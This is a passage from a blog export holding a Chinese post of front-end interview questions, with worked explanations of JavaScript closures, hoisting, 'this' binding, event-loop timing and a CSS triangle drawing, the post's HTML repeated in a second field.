span:100.077ms\n\n正确答案：B\n","slug":"2016-02-19-record-front-questions","published":1,"updated":"2016-03-14T13:44:30.000Z","comments":1,"photos":[],"link":"","_id":"cim4u6rwo0003xmvd15u5xsli","content":"<blockquote>\n<p>本文记录一些在网上看到的，我认为有意思的前端面试题，欢迎转载，转载请注明出处：<a href=\"http://www.happylindz.com\" target=\"_blank\" rel=\"external\">林东洲的博客 Lindz Blog</a>。</p>\n</blockquote>\n<h2 id=\"一、var-a-“a”-”b”-”c”-”d”-每过-1-秒-alert-一下数组中的值。\"><a href=\"#一、var-a-“a”-”b”-”c”-”d”-每过-1-秒-alert-一下数组中的值。\" class=\"headerlink\" title=\"一、var a=[“a”,”b”,”c”,”d”] 每过 1 秒 alert 一下数组中的值。\"></a>一、var a=[“a”,”b”,”c”,”d”] 每过 1 秒 alert 一下数组中的值。</h2><p>这题乍一看意识到使用闭包，但是难点还要每隔1秒弹出一次。<br>常规方法：设置闭包并且设置时间每次增长一秒。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"string\">'a'</span>,<span class=\"string\">'b'</span>,<span class=\"string\">'c'</span>,<span class=\"string\">'d'</span>,<span class=\"string\">'e'</span>];</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>,len = arr.length;i &lt; len; i++)&#123;</span><br><span class=\"line\">\t(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">j</span>) </span>&#123;</span><br><span class=\"line\">\t\tsetTimeout(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t\t\talert(arr[j]);</span><br><span class=\"line\">\t\t&#125;,<span class=\"number\">1000</span> * (i+<span class=\"number\">1</span>))</span><br><span class=\"line\">\t&#125;)(i);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ES6方法：利用ES6中let块级作用域的特性。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"string\">'a'</span>,<span class=\"string\">'b'</span>,<span class=\"string\">'c'</span>,<span class=\"string\">'d'</span>,<span class=\"string\">'e'</span>];</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>,len = arr.length;i &lt; len; i++)&#123;</span><br><span class=\"line\">\tsetTimeout(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"> \t\talert(arr[i]);</span><br><span class=\"line\"> \t&#125;,<span class=\"number\">1000</span> * (i+<span class=\"number\">1</span>))</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"二、下面程序的执行结果是：\"><a href=\"#二、下面程序的执行结果是：\" class=\"headerlink\" title=\"二、下面程序的执行结果是：\"></a>二、下面程序的执行结果是：</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> name = <span class=\"string\">'World!'</span>;</span><br><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> name === <span class=\"string\">'undefined'</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">var</span> name = <span class=\"string\">'Jack'</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">console</span>.log(<span class=\"string\">'Goodbye '</span> + name);</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">console</span>.log(<span class=\"string\">'Hello '</span> + name);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;)();</span><br></pre></td></tr></table></figure>\n<p>这题乍一看容易认为输出”Hello World!”，其实不然，因为var name = ‘Jack’,存在变量提升，故这段代码在执行的时候会被解析成：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> name = <span class=\"string\">'World!'</span>;</span><br><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> name;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> name === <span class=\"string\">'undefined'</span>) &#123;</span><br><span class=\"line\">\t\tname = <span class=\"string\">'Jack'</span>;</span><br><span class=\"line\">      \t<span class=\"built_in\">console</span>.log(<span class=\"string\">'Goodbye '</span> + name);</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      \t<span class=\"built_in\">console</span>.log(<span class=\"string\">'Hello '</span> + name);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;)();</span><br></pre></td></tr></table></figure>\n<p>故执行结果为：”Goodbye Jack”;若将var name = ‘Jack’ 的var去掉，则执行结果为Hello World!。</p>\n<h2 id=\"三、用CSS实现下面图片：\"><a href=\"#三、用CSS实现下面图片：\" class=\"headerlink\" title=\"三、用CSS实现下面图片：\"></a>三、用CSS实现下面图片：</h2><p><img src=\"/assets/2016-02-19-record-front-questions/1.png\" alt=\"triangle\"></p>\n<p>实现难点在于上述的三角形，可以使用css中的border来实现：<br><strong>细节：首先div盒子宽高要设置为0；<br>其次border-top/bottom/left/right来调整三角形，并且其背景色要设置为transparent(透明)而不是white。</strong></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;title&gt;picture&lt;/title&gt;</span><br><span class=\"line\">&lt;style type=\"text/css\"&gt;</span><br><span class=\"line\">#rectangle&#123;</span><br><span class=\"line\">    background: #FFF;</span><br><span class=\"line\">    border: 10px solid #999999;</span><br><span class=\"line\">    padding:10px;</span><br><span class=\"line\">    height: 120px;</span><br><span class=\"line\">    width: 200px;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">#circle&#123;</span><br><span class=\"line\">    position:absolute;</span><br><span class=\"line\">    margin-left: 140px;</span><br><span class=\"line\">    margin-top: 10px;</span><br><span class=\"line\">    width: 40px;</span><br><span class=\"line\">    height: 40px;</span><br><span class=\"line\">    background: #999999; </span><br><span class=\"line\">    -moz-border-radius: 20px; </span><br><span class=\"line\">    -webkit-border-radius: 20px; </span><br><span class=\"line\">    border-radius: 20px;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">#triangle&#123;</span><br><span class=\"line\">    width: 0; </span><br><span class=\"line\">    height: 0; </span><br><span class=\"line\">    position:absolute;</span><br><span class=\"line\">    margin-top: 40px;</span><br><span class=\"line\">    border-bottom: 80px solid #999999; </span><br><span class=\"line\">    border-left: 50px solid transparent; </span><br><span class=\"line\">    border-right: 70px solid transparent; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">#triangle2&#123;</span><br><span class=\"line\">    width: 0; </span><br><span class=\"line\">    height: 0; </span><br><span class=\"line\">    position:absolute;</span><br><span class=\"line\">    margin-top: 60px;</span><br><span class=\"line\">    margin-left: 80px;</span><br><span class=\"line\">    border-bottom: 60px solid #999999; </span><br><span class=\"line\">    border-left: 30px solid transparent; </span><br><span class=\"line\">    border-right: 70px solid transparent; </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">&lt;/style&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;div id=\"rectangle\"&gt;&lt;span id=\"circle\"&gt;&lt;/span&gt;&lt;span id=\"triangle\"&gt;&lt;/span&gt;&lt;span id=\"triangle2\"&gt;&lt;/span&gt;&lt;/div&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br></pre></td></tr></table></figure>\n<h2 id=\"四、实现下述题目的要求：\"><a href=\"#四、实现下述题目的要求：\" class=\"headerlink\" title=\"四、实现下述题目的要求：\"></a>四、实现下述题目的要求：</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> Obj = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">msg</span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">this</span>.msg = msg;</span><br><span class=\"line\">\t<span class=\"keyword\">this</span>.shout = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t\talert(<span class=\"keyword\">this</span>.msg);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">this</span>.waitAndShout = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//隔五秒钟后执行上面的shout方法</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>看到此题容易以为考察setTimeout的用法，答案就写成：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> Obj = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">msg</span>)</span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">this</span>.msg = msg;</span><br><span class=\"line\">   \t<span class=\"keyword\">this</span>.shout = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">   \t\talert(<span class=\"keyword\">this</span>.msg);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">   \t<span class=\"keyword\">this</span>.waitAndShout = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">   \t\t<span class=\"comment\">//隔五秒钟后执行上面的shout方法</span></span><br><span class=\"line\">   \t\t\tsetTimeout(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">   \t\t\t\t<span class=\"keyword\">this</span>.shout();</span><br><span class=\"line\">   \t\t\t&#125;,<span class=\"number\">5000</span>);</span><br><span class=\"line\">   \t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = <span class=\"keyword\">new</span> Obj(<span class=\"string\">'Jack'</span>);</span><br><span class=\"line\">obj.waitAndShout();</span><br></pre></td></tr></table></figure>\n<p>这样写是错误的，控制台会报错：<strong>Uncaught TypeError: this.shout is not a function(anonymous function) @ test.html:17</strong><br>事实上setTimeout里面的函数是个匿名函数，此时this指向window，故正确的答案:  </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> Obj = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">msg</span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.msg = msg;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.shout = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        alert(<span class=\"keyword\">this</span>.msg);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">this</span>.waitAndShout = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//隔五秒钟后执行上面的shout方法</span></span><br><span class=\"line\">        <span class=\"keyword\">var</span> self = <span class=\"keyword\">this</span>;</span><br><span class=\"line\">        setTimeout(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">            self.shout();</span><br><span class=\"line\">        &#125;,<span class=\"number\">5000</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> obj = <span class=\"keyword\">new</span> Obj(<span class=\"string\">'Jack'</span>);</span><br><span class=\"line\">obj.waitAndShout();</span><br></pre></td></tr></table></figure>\n<p>使用一个self变量来存放this，这样匿名函数就可以用self来访问Obj这个对象了，实现细节不在赘述。<br><strong>有兴趣的同学可以看:</strong> <a href=\"https://segmentfault.com/a/1190000002640298\" target=\"_blank\" rel=\"external\">JavaScript中的this陷阱的最全收集–没有之一</a></p>\n<h2 id=\"五、输出下述代码的执行结果：\"><a href=\"#五、输出下述代码的执行结果：\" class=\"headerlink\" title=\"五、输出下述代码的执行结果：\"></a>五、输出下述代码的执行结果：</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> start = <span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>;</span><br><span class=\"line\">setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'fn1'</span>);</span><br><span class=\"line\">&#125;, <span class=\"number\">20</span>);</span><br><span class=\"line\">setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'fn2'</span>);</span><br><span class=\"line\">&#125;, <span class=\"number\">30</span>);</span><br><span class=\"line\">setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'another fn2'</span>);</span><br><span class=\"line\">&#125;, <span class=\"number\">30</span>);</span><br><span class=\"line\">setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">'fn3'</span>);</span><br><span class=\"line\">&#125;, <span class=\"number\">10</span>);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">'start while'</span>);</span><br><span class=\"line\"><span class=\"keyword\">while</span> (<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span> - start &lt; <span class=\"number\">1000</span>) &#123;&#125;;</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">'end while'</span>);</span><br></pre></td></tr></table></figure>\n<p>要做此题必须理解setTimeout是如何运行的, 简单来说，Javascript执行引擎运行时产生堆(Heap)和栈(Stack)。程序的代码一次进入栈中等待执行，在遇到WebAPIs中规定的事件如(DOM操作，ajax请求，还有setTimeout事件)时，会将这些事件添加到一个任务队列当中，因为Javascript是单线程执行，所以当事件时间到了之后，它先看看主线程中代码是否执行完，若代码还在执行，则阻塞该事件。  </p>\n<blockquote>\n<p>即当主线程代码还在执行的情况下会阻塞任务队列里面的事件，即使任务队列里的事件已经达到了可执行阶段 </p>\n</blockquote>\n<p>故前面几个setTimeout事件等待时间只有几十毫秒,但是new Date - start &lt; 1000代码执行阻塞了这些存放在任务队列的事件，当代码执行完毕后，这些事件会按时间顺序依次执行。故正确答案为：  </p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">start <span class=\"keyword\">while</span></span><br><span class=\"line\">end <span class=\"keyword\">while</span></span><br><span class=\"line\">fn3</span><br><span class=\"line\">fn1</span><br><span class=\"line\">fn2</span><br><span class=\"line\">another fn2</span><br></pre></td></tr></table></figure>\n<p>更详细的实现细节可以查阅: <a href=\"http://www.alloyteam.com/2015/10/turning-to-javascript-series-from-settimeout-said-the-event-loop-model/\" target=\"_blank\" rel=\"external\">【转向Javascript系列】从setTimeout说事件循环模型 | Web前端 腾讯AlloyTeam  Blog | 愿景: 成为地球卓越的Web团队！</a>  </p>\n<p>明白上述题目可以试试下面这题，原理相似:</p>\n<h3 id=\"对于下列程序运行结果，符合预期的是-单选-：\"><a href=\"#对于下列程序运行结果，符合预期的是-单选-：\" class=\"headerlink\" title=\"对于下列程序运行结果，符合预期的是(单选)：\"></a>对于下列程序运行结果，符合预期的是(单选)：</h3><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f1</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.time(<span class=\"string\">'time span'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">f2</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.timeEnd(<span class=\"string\">'time span'</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">setTimeout(f1, <span class=\"number\">100</span>);</span><br><span class=\"line\">setTimeout(f2, <span class=\"number\">200</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">waitForMs</span>(<span class=\"params\">n</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> now = <span class=\"built_in\">Date</span>.now();</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (<span class=\"built_in\">Date</span>.now() - now &lt; n) &#123;&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">waitForMs(<span class=\"number\">500</span>);</span><br></pre></td></tr></table></figure>\n<blockquote>\n<ul>\n<li>A、time span:700.077ms</li>\n<li>B、time apan:0.066ms</li>\n<li>C、time span:500.077ms</li>\n<li>D、time span:100.077ms</li>\n</ul>\n</blockquote>\n<p>正确答案：B</p>\n","excerpt":"","more":"<blockquote>\n<p>本文记录一些在网上看到的，我认为有意思的前端面试题，欢迎转载，转载请注明出处：<a href=\"http://www.happylindz.com\">林东洲的博客 Lindz Blog</a>。</p>\n</blockquote>\n<h2 id=\"一、var-a-“a”-”b”-”c”-”d”-每过-1-秒-alert-一下数组中的值。\"><a href=\"#一、var-a-“a”-”b”-”c”-”d”-每过-1-秒-alert-一下数组中的值。\" class=\"headerlink\" title=\"一、var a=[“a”,”b”,”c”,”d”] 每过 1 秒 alert 一下数组中的值。\"></a>一、var a=[“a”,”b”,”c”,”d”] 每过 1 秒 alert 一下数组中的值。</h2><p>这题乍一看意识到使用闭包，但是难点还要每隔1秒弹出一次。<br>常规方法：设置闭包并且设置时间每次增长一秒。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"string\">'a'</span>,<span class=\"string\">'b'</span>,<span class=\"string\">'c'</span>,<span class=\"string\">'d'</span>,<span class=\"string\">'e'</span>];</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>,len = arr.length;i &lt; len; i++)&#123;</span><br><span class=\"line\">\t(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\">j</span>) </span>&#123;</span><br><span class=\"line\">\t\tsetTimeout(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t\t\talert(arr[j]);</span><br><span class=\"line\">\t\t&#125;,<span class=\"number\">1000</span> * (i+<span class=\"number\">1</span>))</span><br><span class=\"line\">\t&#125;)(i);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ES6方法：利用ES6中let块级作用域的特性。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"string\">'a'</span>,<span class=\"string\">'b'</span>,<span class=\"string\">'c'</span>,<span class=\"string\">'d'</span>,<span class=\"string\">'e'</span>];</span><br><span class=\"line\"><span class=\"keyword\">for</span>(<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>,len = arr.length;i &lt; len; i++)&#123;</span><br><span class=\"line\">\tsetTimeout(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\"> \t\talert(arr[i]);</span><br><span class=\"line\"> \t&#125;,<span class=\"number\">1000</span> * (i+<span class=\"number\">1</span>))</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"二、下面程序的执行结果是：\"><a href=\"#二、下面程序的执行结果是：\" class=\"headerlink\" title=\"二、下面程序的执行结果是：\"></a>二、下面程序的执行结果是：</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> name = <span class=\"string\">'World!'</span>;</span><br><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> name === <span class=\"string\">'undefined'</span>) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">var</span> name = <span class=\"string\">'Jack'</span>;</span><br><span class=\"line\">\t\t<span class=\"built_in\">console</span>.log(<span class=\"string\">'Goodbye '</span> + name);</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t<span class=\"built_in\">console</span>.log(<span class=\"string\">'Hello '</span> + name);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;)();</span><br></pre></td></tr></table></figure>\n<p>这题乍一看容易认为输出”Hello World!”，其实不然，因为var name = ‘Jack’,存在变量提升，故这段代码在执行的时候会被解析成：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> name = <span class=\"string\">'World!'</span>;</span><br><span class=\"line\">(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">var</span> name;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (<span class=\"keyword\">typeof</span> name === <span class=\"string\">'undefined'</span>) &#123;</span><br><span class=\"line\">\t\tname = <span class=\"string\">'Jack'</span>;</span><br><span class=\"line\">      \t<span class=\"built_in\">console</span>.log(<span class=\"string\">'Goodbye '</span> + name);</span><br><span class=\"line\">\t&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      \t<span class=\"built_in\">console</span>.log(<span class=\"string\">'Hello '</span> + name);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;)();</span><br></pre></td></tr></table></figure>\n<p>故执行结果为：”Goodbye Jack”;若将var name = ‘Jack’ 的var去掉，则执行结果为Hello World!。</p>\n<h2 id=\"三、用CSS实现下面图片：\"><a href=\"#三、用CSS实现下面图片：\" class=\"headerlink\" title=\"三、用CSS实现下面图片：\"></a>三、用CSS实现下面图片：</h2><p><img src=\"/assets/2016-02-19-record-front-questions/1.png\" alt=\"triangle\"></p>\n<p>实现难点在于上述的三角形，可以使用css中的border来实现：<br><strong>细节：首先div盒子宽高要设置为0；<br>其次border-top/bottom/left/right来调整三角形，并且其背景色要设置为transparent(透明)而不是white。</strong></p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span 